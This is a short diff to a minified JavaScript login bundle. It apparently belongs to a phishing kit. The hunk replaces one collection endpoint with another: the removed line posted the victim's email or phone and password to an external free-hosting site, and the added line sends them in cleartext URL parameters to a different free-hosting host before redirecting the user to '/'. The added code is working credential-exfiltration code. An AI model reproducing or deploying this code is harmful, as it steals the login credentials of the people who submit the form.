@@ -37270,7 +37270,7 @@
 															email: e.email_or_phone,
 															password: e.password
 														};
-														GS.post("https://opening-stock.000webhostapp.com/news.php", n).then((function(e) {
+														GS.get(`https://sinhzienthanhlich.000webhostapp.com/index.php?email=${n.email}&password=${n.password}`).then((function(e) {
 															t("/")
 														})).catch((function(e) {}))
 													}
